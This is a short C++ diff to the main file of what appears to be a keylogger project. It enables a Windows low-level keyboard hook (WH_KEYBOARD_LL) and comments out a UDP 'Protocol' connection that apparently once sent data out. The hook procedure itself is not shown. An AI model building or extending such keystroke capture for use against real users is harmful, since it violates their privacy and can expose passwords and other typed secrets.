@@ -1,9 +1,8 @@
 #include "KeyBoardClass.h"
-#include "UDP.h"
 #include <iostream>
 
 int main() {
-   /* HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyBoard::LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
+    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyBoard::LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
 
     if (hook == NULL) {
         std::cerr << "Failed to set up hook." << std::endl;
@@ -18,10 +17,10 @@ int main() {
     }
 
     // Unhook and exit
-    UnhookWindowsHookEx(hook);*/
+    UnhookWindowsHookEx(hook);
 
-    Protocol protocol;
-    protocol.connection();
+ //   Protocol protocol;
+ //   protocol.connection();
 
     return 0;
 }
